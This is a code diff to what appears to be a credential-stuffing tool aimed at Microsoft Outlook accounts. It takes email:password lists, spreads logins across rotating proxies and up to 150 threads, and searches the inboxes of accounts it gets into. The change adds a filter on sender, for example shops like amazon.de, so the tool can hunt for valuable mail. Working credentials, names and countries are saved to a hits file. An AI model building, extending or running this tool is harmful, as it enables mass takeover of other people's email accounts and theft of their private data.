@@ -677,7 +677,7 @@ _OUTLOOK_STATE: Dict[str, Any] = {
     "running": False, "done": False, "total": 0,
     "hits": 0, "bad": 0, "found": 0, "retries": 0,
     "results": [], "error": "", "mode": "bruter",
-    "keyword": "", "started_at": None, "finished_at": None,
+    "keyword": "", "sender": "", "started_at": None, "finished_at": None,
 }
 _OUTLOOK_LOCK = threading.Lock()
 _OUTLOOK_STOP = threading.Event()
@@ -687,16 +687,17 @@ class OutlookBody(BaseModel):
     accounts: List[str] = Field(..., min_length=1)
     mode: str = Field("bruter", pattern="^(bruter|inboxer)$")
     keyword: Optional[str] = None
+    sender: Optional[str] = None
     proxy_file: Optional[str] = None
     workers: Optional[int] = None
 
 
-def _outlook_reset(total: int, mode: str, keyword: str) -> None:
+def _outlook_reset(total: int, mode: str, keyword: str, sender: str = "") -> None:
     with _OUTLOOK_LOCK:
         _OUTLOOK_STATE.update(
             running=True, done=False, total=total,
             hits=0, bad=0, found=0, retries=0,
-            results=[], error="", mode=mode, keyword=keyword,
+            results=[], error="", mode=mode, keyword=keyword, sender=sender,
             started_at=time.time(), finished_at=None,
         )
         _OUTLOOK_STOP.clear()
@@ -862,8 +863,22 @@ def _msft_get_profile(session, substrate_token: str, email: str,
 
 
 def _msft_search_inbox(session, refresh_token: str, email: str,
-                        keyword: str, timeout: int = 30) -> int:
-    """Search inbox for keyword, return match count (0 = not found / error)."""
+                        keyword: str, timeout: int = 30,
+                        sender: str = "") -> int:
+    """Search inbox for keyword (+ optional from: filter), return match count."""
+    # Build query string: combine sender filter with keyword
+    parts = []
+    if sender:
+        # Support multiple senders comma-separated: "amazon.de,audible.de"
+        senders = [s.strip() for s in sender.split(",") if s.strip()]
+        if len(senders) == 1:
+            parts.append(f"from:{senders[0]}")
+        elif senders:
+            from_clause = " OR ".join(f"from:{s}" for s in senders)
+            parts.append(f"({from_clause})")
+    if keyword:
+        parts.append(keyword)
+    query_string = " ".join(parts) if parts else "*"
     r = session.post(
         f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
         data={"client_id": _MSFT_CLIENT_ID, "refresh_token": refresh_token,
@@ -890,7 +905,7 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
                         {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                     ]},
                     "From": 0,
-                    "Query": {"QueryString": keyword},
+                    "Query": {"QueryString": query_string},
                     "Size": 25,
                     "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
                               {"Field": "Time", "SortDirection": "Desc"}],
@@ -923,7 +938,7 @@ def _msft_search_inbox(session, refresh_token: str, email: str,
 
 
 def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
-                          mode: str, keyword: str) -> None:
+                          mode: str, keyword: str, sender: str = "") -> None:
     """Run one account: brute + optional inbox search. Updates _OUTLOOK_STATE."""
     import requests as _rq
     session = _rq.Session()
@@ -978,11 +993,11 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
             )
 
             found_count = 0
-            if mode == "inboxer" and keyword:
+            if mode == "inboxer" and (keyword or sender):
                 found_count = _msft_search_inbox(session, tokens["refresh_token"],
-                                                  email, keyword)
+                                                  email, keyword, sender=sender)
                 if found_count > 0:
-                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | kw={keyword}")
+                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | q={keyword} from={sender}")
                     with open(_OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt", "a", encoding="utf-8") as fh:
                         fh.write(f"{email}:{password} | Name: {name} | Country: {country} | Found: {found_count}\n")
 
@@ -1003,7 +1018,7 @@ def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
 
 
 def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
-                  proxy_file: Optional[str], workers: int) -> None:
+                  sender: str, proxy_file: Optional[str], workers: int) -> None:
     """Batch runner. Runs in a background thread."""
     # Build proxy pool (round-robin)
     proxies: List[str] = []
@@ -1064,7 +1079,7 @@ def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
     def _do_one(acc: Tuple[str, str]) -> None:
         em, pw = acc
         proxy = _get_proxy()
-        _run_outlook_account(em, pw, proxy, mode, keyword or "")
+        _run_outlook_account(em, pw, proxy, mode, keyword or "", sender or "")
         with lock:
             done[0] += 1
             pct = done[0] / total * 100
@@ -1117,10 +1132,10 @@ async def api_outlook_start(
         raise HTTPException(status_code=400, detail="no valid email:password lines")
     workers = body.workers or (15 if body.mode == "inboxer" else 100)
     workers = min(max(workers, 1), 150)
-    _outlook_reset(len(accounts), body.mode, body.keyword or "")
+    _outlook_reset(len(accounts), body.mode, body.keyword or "", body.sender or "")
     threading.Thread(
         target=_run_outlook,
-        args=(accounts, body.mode, body.keyword or "",
+        args=(accounts, body.mode, body.keyword or "", body.sender or "",
               body.proxy_file, workers),
         daemon=True,
     ).start()
